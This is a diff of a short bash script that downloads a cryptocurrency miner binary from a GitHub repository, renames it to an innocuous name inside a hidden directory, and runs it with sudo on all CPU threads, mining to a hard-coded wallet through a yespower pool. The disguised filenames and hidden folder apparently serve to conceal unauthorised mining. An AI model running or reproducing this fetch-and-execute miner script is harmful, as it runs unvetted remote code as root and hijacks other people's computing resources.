@@ -1,6 +1,6 @@
 #!/bin/bash
-apt-get update ; apt-get install sudo -y
+apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
-wget -O saga https://github.com/nandafiku/gradi/raw/main/cpuminer-avx2
-chmod 777 saga
-./saga -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7052 -u uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.x -p webpassword=x -t $(nproc --all)
+wget -O skak https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
+chmod 777 skak
+sudo ./skak --algorithm yespower --pool stratum-na.rplant.xyz:7052 --wallet uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.x --password webpassword=x --cpu-threads $(nproc --all)
